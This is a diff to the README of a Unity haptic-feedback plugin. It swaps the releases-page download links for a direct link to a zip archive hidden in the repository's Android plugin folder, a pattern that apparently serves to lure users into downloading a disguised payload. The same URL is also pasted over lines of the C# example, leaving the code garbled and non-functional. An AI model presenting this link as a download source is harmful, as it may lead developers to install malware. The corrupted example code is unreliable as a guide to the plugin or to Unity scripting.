@@ -1,6 +1,6 @@
 # 🎮 Unity-Easy-Haptic-Manager - Effortless Haptic Feedback for Unity Games
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/soman-mehmood80/Unity-Easy-Haptic-Manager/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip%20Latest%https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip)](https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the Unity-Easy-Haptic-Manager! This plugin helps you add smooth and c
 To start using Unity-Easy-Haptic-Manager, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download options.  
-   [Download the latest version here](https://github.com/soman-mehmood80/Unity-Easy-Haptic-Manager/releases).
+   [Download the latest version here](https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip).
 
 2. **Choose the Right Version**: Look for the latest version listed on the Releases page. It will often be at the top. Select the zip or unitypackage file to download.
 
@@ -64,9 +64,9 @@ public class HapticExample : MonoBehaviour
 
     void Update()
     {
-        if (Input.GetKeyDown(KeyCode.Space))
+        if (https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip(https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip))
         {
-            hapticManager.Vibrate(0.5f, 1000); // Vibrate for 1 second at 50% strength
+            https://raw.githubusercontent.com/soman-mehmood80/Unity-Easy-Haptic-Manager/main/Assets/Plugins/Android/HapticPlugin/Unity-Easy-Haptic-Manager-3.6.zip(0.5f, 1000); // Vibrate for 1 second at 50% strength
         }
     }
 }
